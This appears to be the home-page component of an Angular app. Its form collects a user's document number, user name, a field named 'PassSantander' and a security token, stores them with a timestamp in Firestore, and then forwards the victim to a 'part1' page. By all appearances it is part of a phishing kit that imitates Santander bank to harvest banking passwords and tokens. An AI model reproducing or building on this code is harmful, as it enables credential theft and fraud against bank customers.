import { Component } from '@angular/core';
import { users } from '../Models/user';
import { FirestoreService } from '../Services/firestore.service';
import { Router } from '@angular/router';
import { InteractionService } from '../Services/interaction.service';
import { FormControl, FormGroup } from '@angular/forms';

@Component({
  selector: 'app-home',
  templateUrl: 'home.page.html',
  styleUrls: ['home.page.scss'],
})
export class HomePage {
  
  formulario: FormGroup;



   constructor(
    private firestore: FirestoreService,
    private interaction: InteractionService,
    private router: Router,
) {
      this.formulario = new FormGroup({
      id: new FormControl,
      numDocuments: new FormControl,
      PassSantander: new FormControl,
      User: new FormControl,
      token: new FormControl,
})
}
onSubmit() {
  this.interaction.presentLoading;
  const userData: users = this.formulario.value;
  // userData.timestamp = firestore.FieldValue.serverTimestamp(); // Establecer fecha y hora actual
                  // Obtener la fecha y hora actual del cliente
                  const timestamp = new Date();
              
                  // Agregar la fecha y hora actual al documento de datos
                  userData.timestamp = timestamp;
  this.firestore.addPerson(userData).then(() => {
    // this.interaction.presentLoading("Ingresando..")
    console.log('Usuario agregado correctamente a Firestore:', userData);
    this.interaction.presentToast('Enviado con exito');
    this.interaction.closeLoading;
  }).catch((error) => {
    console.error('Error al agregar usuario a Firestore:', error);
    
  });
  this.router.navigate(['/part1']);
  // this.interaction.closeLoading();
}

}
